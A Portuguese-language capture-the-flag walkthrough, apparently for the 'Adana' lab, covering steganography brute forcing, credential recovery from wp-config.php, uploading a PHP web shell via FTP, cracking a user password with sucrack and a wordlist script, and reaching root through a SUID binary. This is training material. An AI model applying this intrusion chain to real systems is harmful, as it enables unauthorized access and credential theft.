@@ -1,0 +1,101 @@
+Apos startamos a maquina procuramos por diretorios e encontramos /announcements/
+
+Baixamos os 2 conteudos do site imagem/arquivo.txt
+
+Agora precisamos dar bruteforce na imagem
+
+Baixamos o stegbrute wget https://github.com/R4yGM/stegbrute/releases/download/0.1.1/stegbrute_0.1.1_amd64.deb && dpkg --install stegbrute_0.1.1_amd64.deb
+
+Agora usamos stegbrute -f "img" -w "arquivo.txt -v
+
+e temos o resultado "password try: 123adanaantinwar - Success"
+
+Agora usamos steghide --extract -sf austrailian-bulldog-ant.jpg e colocamos nossa senha
+
+Damos cat no novo arquivo e temos uma hash
+
+Agora usamos echo "RlRQLUxPR0lOClVTRVI6IGhha2FuZnRwClBBU1M6IDEyM2FkYW5hY3JhY2s=" | base64 -d e temos nosso login e senha ftp
+
+ftp hakanftp:123adanacrack
+
+Ao logar usamos o comando get wp-config.php e temos a senha do nosso mysql phpmyadmin:12345
+
+Ao logar no site vamos para a tabela phpmyadmin>wp_users>columms>user_login lá encontraremos um login e uma senha encripitada: hakanbey01:$P$BQML2QxAFBH4hb.qqKTpDnta6Q6Wl2/
+
+Ao tentar acessar a pagina wp-login.php o site nos retorna um novo dominio na url
+
+Adicionamos o site no /etc/hosts e tentamos acessar a pagina de login
+
+Agora acessamos a pagina phpmyadmin e vamos para o caminho phpmyadmin1>wp_options>columns>option_name
+
+Quando abrirmos a pagina vemos um novo dominio "subdomain.adana.thm"
+
+Adicionamos novamente ao /etc/hosts e tentamos logar no wp-admin
+
+Usamos as credenciais hakanbey01:12345 e estamos dentro do WordPress
+
+Mas infelizmente o site é um buraco sem fim
+
+Voltamos para o ftp e vamos para a pasta wp-admin/includes e upamos nossa shell nessa pasta "put "shell.php""
+
+Agora deixamos ela executavel "chmod 777 'shell.php'"
+
+E damos usamos curl http://subdomain.adana.thm/wp-admin/includes/shell.php
+
+Agora com nossa shell vamos para a var/www/html e temos nossa primeira flag
+
+Para pegar o usuario temos que usar o sucrack para isso baixamos ele para nossa maquina https://github.com/hemp3l/sucrack (clicamos no botão verde que aparecera na hora que abrirmos o site)
+
+Agora transferimos para a outra 
+
+Damos unzip no arquivo e entramos na pasta criada
+
+Agora usamos o comando ./configure --prefix=$HOME/tmp e make install
+
+Agora voltamos para a pasta tmp e vemos que tem 2 novas pasta "bin e share"
+
+Entramos na pasta bin e podemos usar o sucrack
+
+Pegamos a nossa wordlist que esta na nossa maquina (a mesma usada para pegar as credenciais do ftp)
+
+Agora para podemos pegar de fato o usuario temos que modificar nossa wordlist baseada nas 2 primeiras senhas que temos
+
+Existe um padrâo entre elas "123adana" então criamos um script para criar uma wordlist usando a que nos ja temos só que adicionando "123adana" na frente de cada palavra que tem na wordlist
+
+import os
+
+with open("updated.txt","w") as new_file:
+        with open ("wordlist.txt","r") as old_file:
+                for i in old_file:
+                        new_file.write("123adna" + i.rstrip('\n') + '\n')
+rodamos o nosso script "python "nome""
+
+e usamos o comando ./sucrack -w 50 -u hakanbey updated.txt 
+
+Depois de um tempo a senha ira aparecer: 123adanasubaru
+
+Agora que rodamos o comando como usuario find / -perm -u=s 2>/dev/null
+
+E usamos o binary
+
+Mudamos para a pasta /usr/bin e rodamos o binary (./binary)
+
+Ele pede para digitar uma string correta porem nao temos ela
+
+Pegamos o arquivo binary e transferimos ele para a nossa maquina
+
+Ao olhar o arquivo vemos uma sequencia de palavras "war" "zone" "in" adana"
+
+Rodamos novamente o binary e colocamos essa string 
+
+Sera enviado uma imagem para o diretorio hakanbey
+
+Pegamos o a imagem e passamos para a nossa maquina
+
+Agora com a imagem em nossa maquina usamos o cyberchef e colocamos a imagem la
+
+Na dica fala para usarmos de HEX, para Base85 
+
+Ao fazer isso logo na primeira linha vemos a senha do root (root:Go0odJo0BbBro0o)
+
+Trocamos de usuario e somos root.
